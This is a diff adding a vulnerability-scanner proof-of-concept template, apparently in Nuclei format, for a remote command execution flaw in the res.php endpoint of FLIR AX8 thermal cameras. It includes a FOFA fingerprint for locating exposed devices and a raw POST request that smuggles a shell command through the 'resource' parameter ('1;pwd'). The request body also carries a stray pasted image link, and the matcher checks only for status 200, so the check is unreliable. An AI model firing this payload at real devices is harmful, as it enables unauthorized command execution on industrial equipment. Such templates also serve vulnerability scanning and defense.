@@ -1,0 +1,44 @@
+id: poc-xf70fsevvm9pzv8q
+info:
+  name: FLIR-AX8热成像仪res.php存在远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xf70fsevvm9pzv8q'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xf70fsevvm9pzv8q
+    fofa: web.icon=="f4370ff0b4763e18159cd7cdf36a4542"
+http:
+- raw:
+  - 'POST /res.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Cookie: *****
+
+    Upgrade-Insecure-Requests: 1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 67
+
+
+    action=node&resource=1;pwd
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1728983557444-987ddc39-4e33-45c8-8dad-071ac17e6a96.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
